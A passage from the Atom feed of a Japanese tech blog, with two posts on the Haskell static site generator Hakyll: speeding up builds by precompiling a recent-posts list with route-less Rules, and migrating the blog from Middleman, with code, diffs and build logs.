<span id="cb7-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/ul&gt;</span></span>
<span id="cb7-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/div&gt;</span></span></code></pre></div>
<p>このテンプレートを使って、<code>recent-posts.html</code> に最新記事リストを生成するようにします。このファイルはサイトを公開する際には必要ないので、<code>route</code> は記述しません。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb8-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff --git a/site.hs b/site.hs</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-2" aria-hidden="true" tabindex="-1"></a>index 53650a8..2d738ab 100644</span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="dt">--- a/site.hs</span></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/site.hs</span></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -77,6 +77,14 @@ main = hakyll $ do</span></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-6" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= loadAndApplyTemplate &quot;templates/default.html&quot; ctx</span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-7" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= relativizeUrls</span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-8" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="va">+    create [&quot;recent-posts.html&quot;] $</span></span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="va">+        compile $ do</span></span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="va">+                      defaultContext</span></span>
<span id="cb8-14"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="va">+            makeItem &quot;&quot;</span></span>
<span id="cb8-15"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="va">+                &gt;&gt;= loadAndApplyTemplate &quot;templates/recent-posts.html&quot; ctx</span></span>
<span id="cb8-16"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-16" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb8-17"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb8-17" aria-hidden="true" tabindex="-1"></a>     match &quot;templates/*&quot; $ compile templateCompiler</span></code></pre></div>
<p>そして、最新記事を毎回列挙するかわりに <code>recent-posts.html</code> を <a href="https://www.stackage.org/haddock/lts-12.6/hakyll-4.12.3.0/Hakyll-Core-Compiler.html#v:loadBody"><code>loadBody</code></a> するようにします。今回は読み込んだ最新記事リストを <code>recent-list</code> という <code>Context</code> でテンプレート側に渡すことにしました。</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb9-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff --git a/site.hs b/site.hs</span></span>
<span id="cb9-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-2" aria-hidden="true" tabindex="-1"></a>index 2d738ab..7a9d26a 100644</span>
<span id="cb9-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="dt">--- a/site.hs</span></span>
<span id="cb9-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/site.hs</span></span>
<span id="cb9-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -18,8 +18,8 @@ main = hakyll $ do</span></span>
<span id="cb9-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-6" aria-hidden="true" tabindex="-1"></a>     match (fromList [&quot;about.rst&quot;, &quot;contact.markdown&quot;]) $ do</span>
<span id="cb9-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-7" aria-hidden="true" tabindex="-1"></a>         route   $ setExtension &quot;html&quot;</span>
<span id="cb9-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-8" aria-hidden="true" tabindex="-1"></a>         compile $ do</span>
<span id="cb9-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="st">-            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb9-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="st">-            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb9-11"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- loadBody &quot;recent-posts.html&quot;</span></span>
<span id="cb9-12"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = constField &quot;recent-list&quot; recent `mappend`</span></span>
<span id="cb9-13"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-13" aria-hidden="true" tabindex="-1"></a>                       defaultContext</span>
<span id="cb9-14"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-14" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-15"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-15" aria-hidden="true" tabindex="-1"></a>             pandocCompiler</span>
<span id="cb9-16"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -32,8 +32,8 @@ main = hakyll $ do</span></span>
<span id="cb9-17"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-17" aria-hidden="true" tabindex="-1"></a>             content &lt;- pandocCompiler</span>
<span id="cb9-18"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-18" aria-hidden="true" tabindex="-1"></a>                 &gt;&gt;= saveSnapshot &quot;content&quot;</span>
<span id="cb9-19"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-19" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-20"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-20" aria-hidden="true" tabindex="-1"></a><span class="st">-            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb9-21"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-21" aria-hidden="true" tabindex="-1"></a><span class="st">-            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb9-22"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-22" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- loadBody &quot;recent-posts.html&quot;</span></span>
<span id="cb9-23"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-23" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = constField &quot;recent-list&quot; recent `mappend`</span></span>
<span id="cb9-24"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-24" aria-hidden="true" tabindex="-1"></a>                       postCtx</span>
<span id="cb9-25"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-25" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-26"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-26" aria-hidden="true" tabindex="-1"></a>             loadAndApplyTemplate &quot;templates/post.html&quot; postCtx content</span>
<span id="cb9-27"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-27" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -49,8 +49,8 @@ main = hakyll $ do</span></span>
<span id="cb9-28"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-28" aria-hidden="true" tabindex="-1"></a>                     constField &quot;title&quot; &quot;Archives&quot;            `mappend`</span>
<span id="cb9-29"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-29" aria-hidden="true" tabindex="-1"></a>                     defaultContext</span>
<span id="cb9-30"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-30" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-31"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-31" aria-hidden="true" tabindex="-1"></a><span class="st">-            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb9-32"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-32" aria-hidden="true" tabindex="-1"></a><span class="st">-            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb9-33"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-33" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- loadBody &quot;recent-posts.html&quot;</span></span>
<span id="cb9-34"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-34" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = constField &quot;recent-list&quot; recent `mappend`</span></span>
<span id="cb9-35"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-35" aria-hidden="true" tabindex="-1"></a>                       archiveCtx</span>
<span id="cb9-36"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-36" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-37"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-37" aria-hidden="true" tabindex="-1"></a>             makeItem &quot;&quot;</span>
<span id="cb9-38"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-38" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -68,8 +68,8 @@ main = hakyll $ do</span></span>
<span id="cb9-39"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-39" aria-hidden="true" tabindex="-1"></a>                     constField &quot;title&quot; &quot;Home&quot;                `mappend`</span>
<span id="cb9-40"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-40" aria-hidden="true" tabindex="-1"></a>                     defaultContext</span>
<span id="cb9-41"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-41" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-42"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-42" aria-hidden="true" tabindex="-1"></a><span class="st">-            recent &lt;- fmap (take 5) . recentFirst =&lt;&lt; loadAllSnapshots &quot;posts/*&quot; &quot;content&quot;</span></span>
<span id="cb9-43"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-43" aria-hidden="true" tabindex="-1"></a><span class="st">-            let ctx = listField &quot;recent-posts&quot; postCtx (return recent) `mappend`</span></span>
<span id="cb9-44"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-44" aria-hidden="true" tabindex="-1"></a><span class="va">+            recent &lt;- loadBody &quot;recent-posts.html&quot;</span></span>
<span id="cb9-45"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-45" aria-hidden="true" tabindex="-1"></a><span class="va">+            let ctx = constField &quot;recent-list&quot; recent `mappend`</span></span>
<span id="cb9-46"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-46" aria-hidden="true" tabindex="-1"></a>                       indexCtx</span>
<span id="cb9-47"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-47" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb9-48"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb9-48" aria-hidden="true" tabindex="-1"></a>             getResourceBody</span></code></pre></div>
<p>最後に、<code>templates/default.html</code> に追加した最新記事リスト生成部分を <code>$recent-list$</code> に変更します。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb10-1"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff --git a/templates/default.html b/templates/default.html</span></span>
<span id="cb10-2"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-2" aria-hidden="true" tabindex="-1"></a>index 980bb9b..0963027 100644</span>
<span id="cb10-3"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="dt">--- a/templates/default.html</span></span>
<span id="cb10-4"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ b/templates/default.html</span></span>
<span id="cb10-5"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -26,16 +26,9 @@</span></span>
<span id="cb10-6"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-6" aria-hidden="true" tabindex="-1"></a>             $body$</span>
<span id="cb10-7"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-7" aria-hidden="true" tabindex="-1"></a>         &lt;/div&gt;</span>
<span id="cb10-8"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-8" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb10-9"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="st">-        &lt;div id=&quot;recent-posts&quot;&gt;</span></span>
<span id="cb10-10"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="st">-            &lt;h2&gt;Recent posts&lt;/h2&gt;</span></span>
<span id="cb10-11"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="st">-            &lt;ul&gt;</span></span>
<span id="cb10-12"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="st">-                $for(recent-posts)$</span></span>
<span id="cb10-13"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="st">-                    &lt;li&gt;</span></span>
<span id="cb10-14"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="st">-                        &lt;a href=&quot;$url$&quot;&gt;$title$&lt;/a&gt; - $date$</span></span>
<span id="cb10-15"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="st">-                    &lt;/li&gt;</span></span>
<span id="cb10-16"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-16" aria-hidden="true" tabindex="-1"></a><span class="st">-                $endfor$</span></span>
<span id="cb10-17"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="st">-            &lt;/ul&gt;</span></span>
<span id="cb10-18"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-18" aria-hidden="true" tabindex="-1"></a><span class="st">-        &lt;/div&gt;</span></span>
<span id="cb10-19"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-19" aria-hidden="true" tabindex="-1"></a><span class="va">+        $if(recent-list)$</span></span>
<span id="cb10-20"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-20" aria-hidden="true" tabindex="-1"></a><span class="va">+            $recent-list$</span></span>
<span id="cb10-21"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-21" aria-hidden="true" tabindex="-1"></a><span class="va">+        $endif$</span></span>
<span id="cb10-22"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-22" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb10-23"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-23" aria-hidden="true" tabindex="-1"></a>         &lt;div id=&quot;footer&quot;&gt;</span>
<span id="cb10-24"><a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#cb10-24" aria-hidden="true" tabindex="-1"></a>             Site proudly generated by</span></code></pre></div>
<p>これで再度ビルドしてみます。すると・・・</p>
<pre><code>$ time stack exec site rebuild
Removing _site...
Removing _cache...
Removing _cache/tmp...
Initialising...
  Creating store...
  Creating provider...
  Running rules...
Checking for out-of-date items
Compiling
  updated templates/recent-posts.html
  updated recent-posts.html
  updated templates/default.html
  updated about.rst
  updated templates/post.html
  updated posts/2015-08-23-example.markdown
  updated posts/2016-01-23-example.markdown
  ...
  updated templates/post-list.html
  updated archive.html
  updated contact.markdown
  updated css/default.css
  updated index.html
Success
stack exec site rebuild  3.93s user 0.31s system 103% cpu 4.098 total</code></pre>
<p>めちゃくちゃ速くなりました ∩(＞◡＜*)∩</p>
<h2 id="まとめ">まとめ</h2>
<p><code>route</code> なしの <code>Rules</code> の挙動を使ってプリコンパイルのようなことを行い、ビルドを高速化する方法を紹介しました。<a href="https://blog.myon.info/">blog.myon.info</a> では、この方法でフッタのプリコンパイルをするようにしたことで、1分半程度掛かっていたビルドが40秒ほどで済むようになりました。</p>
<p><code>route</code> なしの <code>Rules</code> の活用法はまだたくさんありそうです。<a href="https://www.blaenkdenum.com/posts/extra-dependencies-in-hakyll/">Extra Dependencies in Hakyll - Blaenk Denum</a> では、scss のような複数のファイルから1つのファイルを生成したいというケースを Extra Dependencies を使って実現する例を紹介していますが、ここでも活躍しています。</p>
<p>ということで、Hakyll 便利なのでみんな使いましょう！</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>自身が自身に依存してしまうので<a href="https://blog.myon.info/entry/2018/08/16/non-route-rules/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>ブログを Hakyll に移行した</title>
    <link href="https://blog.myon.info/entry/2018/03/21/hakyll/index.html" />
    <id>https://blog.myon.info/entry/2018/03/21/hakyll/index.html</id>
    <published>2018-03-21T13:44:00Z</published>
    <updated>2018-03-21T13:44:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://middlemanapp.com/">Middleman</a> で構築していたこのブログを、Haskell 製の静的サイトジェネレータである <a href="https://jaspervdj.be/hakyll/">Hakyll</a> に移行しました。</p>
<!--more-->
<h2 id="移行した理由">移行した理由</h2>
<p>主な理由は次の通り</p>
<ul>
<li><strong>Middleman 4.x になってからの不安定さに耐えられなくなった</strong></li>
<li>以前から Hakyll 興味があった</li>
<li>普段書かない言語で設定を書くのはつらい</li>
</ul>
<p>この中でも、特に1つ目の要因が大きいです。</p>
<p>まず、重くなりました。以前 Travis CI 上で数分で済んでいた記事のビルドが、今では10分を超えることもあります。また、Middleman ではページの変更を監視してプレビューに反映させる Livereload を利用できるのですが、これも今では10~20秒程度 CPU 食いつぶさないと反映されなくなってしまいました。</p>
<p>なかなか Middleman から移行できなかった理由でもあるフロントエンドライブラリの扱いやすさ (<code>Gemfile</code> に記述するだけで利用できる、Rails のおかげで gem も豊富) も微妙になってしまいました。この機能を実現していた部分が middleman-sprockets に分離され、またその利用はあまり推奨されなくなりました。その middleman-sprockets も、初期は middleman が起動しなくなるほど不安定で、そこそこ動くようになってからも gem の種類やバージョンの違いでフロントエンドライブラリがロードできたりできなかったりで、更新のたびに動作する組み合わせを探さないといけないのは不満でした。</p>
<h2 id="移行してみて">移行してみて</h2>
<h3 id="hakyll-の-rules">Hakyll の Rules</h3>
<p>Hakyll では、「どのファイルを、どう加工して、どこに出力するか」という設定 (rule) を、出力するファイル全てに対して記述する必要があります。例えばこんな感じ。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb1-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-2" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> hakyll <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- css/ 下のファイルを、minify して、/css/* に出力</span></span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-4" aria-hidden="true" tabindex="-1"></a>  match <span class="st">&quot;css/*&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-5" aria-hidden="true" tabindex="-1"></a>    route   idRoute</span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-6" aria-hidden="true" tabindex="-1"></a>    compile compressCssCompiler</span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- entry/ 下の Markdown ファイルを、pandoc で変換して、/entry/*.html に出力</span></span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-9" aria-hidden="true" tabindex="-1"></a>  match <span class="st">&quot;entry/*.md&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-10" aria-hidden="true" tabindex="-1"></a>    route <span class="op">$</span> setExtension <span class="st">&quot;html&quot;</span></span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb1-11" aria-hidden="true" tabindex="-1"></a>    compile pandocCompiler</span></code></pre></div>
<p>このため、複雑な設定ができる反面、出力先を指定するだけのような Middleman と比較すると記述量は多くなります。コード書くのは好きなので記述量が増えるのはいいのですが、Middleman で実現していたものと同じ出力をする rule を記述するのは、Hakyll が初めてということもあってちょっと大変でした。</p>
<p>この Rules の設定をもとに、Hakyll では対象の依存関係を調べ、ページを更新するかなどの判断をしているようです。この依存関係の管理が賢くて驚きました。例えばこんな rule があったとします。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb2-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-1" aria-hidden="true" tabindex="-1"></a>match <span class="st">&quot;posts/*&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-2" aria-hidden="true" tabindex="-1"></a>  route <span class="op">$</span> setExtension <span class="st">&quot;html&quot;</span></span>
<span id="cb2-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-3" aria-hidden="true" tabindex="-1"></a>  compile <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb2-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-4" aria-hidden="true" tabindex="-1"></a>    posts <span class="ot">&lt;-</span> recentFirst <span class="op">=&lt;&lt;</span> loadAll <span class="st">&quot;posts/*&quot;</span></span>
<span id="cb2-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> ctx <span class="ot">=</span> listField <span class="st">&quot;posts&quot;</span> postCtx (<span class="fu">return</span> posts)</span>
<span id="cb2-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-6" aria-hidden="true" tabindex="-1"></a>            <span class="op">&lt;&gt;</span> postCtx</span>
<span id="cb2-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-8" aria-hidden="true" tabindex="-1"></a>    pandocCompiler</span>
<span id="cb2-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-9" aria-hidden="true" tabindex="-1"></a>      <span class="op">&gt;&gt;=</span> loadAndApplyTemplate <span class="st">&quot;templates/post.html&quot;</span>    ctx</span>
<span id="cb2-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">&gt;&gt;=</span> loadAndApplyTemplate <span class="st">&quot;templates/default.html&quot;</span> ctx</span>
<span id="cb2-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb2-11" aria-hidden="true" tabindex="-1"></a>      <span class="op">&gt;&gt;=</span> relativizeUrls</span></code></pre></div>
<p>これを実行してみると、こんなエラーをだして終了します</p>
<pre><code>$ stack exec myon rebuild
Removing _site...
Removing _cache...
Removing _cache/tmp...
Initialising...
  Creating store...
  Creating provider...
  Running rules...
Checking for out-of-date items
Compiling
  updated templates/default.html
  updated about.rst
  [ERROR] Hakyll.Core.Runtime.chase: Dependency cycle detected: posts/2015-08-23-example.markdown depends on posts/2015-08-23-example.markdown</code></pre>
<p><code>"posts/*"</code> に対する rule の中で <code>"posts/*"</code> の情報を取得しているので、自身が自身に依存するという状況ができてしまいます。このような依存関係のループも検出してくれるみたいです。</p>
<p>ちなみに、このようなルールを実現したいときは、コンパイルの途中の結果を保存しておく snapshot を利用すると良さそうです。</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb4-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-1" aria-hidden="true" tabindex="-1"></a>match <span class="st">&quot;posts/*&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-2" aria-hidden="true" tabindex="-1"></a>  route <span class="op">$</span> setExtension <span class="st">&quot;html&quot;</span></span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-3" aria-hidden="true" tabindex="-1"></a>  compile <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">-- pandoc でコンパイルした結果を &quot;content&quot; という名前で snapshot を取る</span></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-5" aria-hidden="true" tabindex="-1"></a>    r <span class="ot">&lt;-</span> pandocCompiler</span>
<span id="cb4-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-6" aria-hidden="true" tabindex="-1"></a>      <span class="op">&gt;&gt;=</span> saveSnapshot <span class="st">&quot;content&quot;</span></span>
<span id="cb4-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">-- &quot;posts/*&quot; の記事の &quot;content&quot; という名前の snapshot を読み込む</span></span>
<span id="cb4-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-9" aria-hidden="true" tabindex="-1"></a>    posts <span class="ot">&lt;-</span> recentFirst <span class="op">=&lt;&lt;</span> loadAllSnapshots <span class="st">&quot;posts/*&quot;</span> <span class="st">&quot;content&quot;</span></span>
<span id="cb4-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> ctx <span class="ot">=</span> listField <span class="st">&quot;posts&quot;</span> postCtx (<span class="fu">return</span> posts)</span>
